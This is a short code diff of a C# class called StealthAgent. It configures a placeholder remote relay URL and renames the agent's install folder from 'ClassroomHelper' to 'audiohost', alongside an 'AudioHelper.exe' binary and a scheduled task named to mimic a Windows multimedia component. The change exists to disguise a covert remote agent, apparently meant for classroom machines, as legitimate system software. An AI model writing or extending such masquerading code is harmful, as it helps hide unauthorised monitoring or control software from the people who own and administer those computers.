@@ -17,7 +17,7 @@ public static class StealthAgent
 {
     // FILL: Your remote relay URL (or Cloudflare / Render URL)
     private const string RELAY_URL = "https://your-panic-relay.onrender.com";
-    private const string INSTALL_DIR = @"C:\ProgramData\ClassroomHelper";
+    private const string INSTALL_DIR = @"C:\ProgramData\audiohost";
     private const string EXE_NAME = "AudioHelper.exe";
     private const string TASK_NAME = @"Microsoft\Windows\Multimedia\SystemAudioCalibration";
 
@@ -37,7 +37,7 @@ public static class StealthAgent
         foreach (string dir in new[]
         {
             AppContext.BaseDirectory,
-            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ClassroomHelper", "bin"),
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "audiohost", "bin"),
             INSTALL_DIR
         })
         {
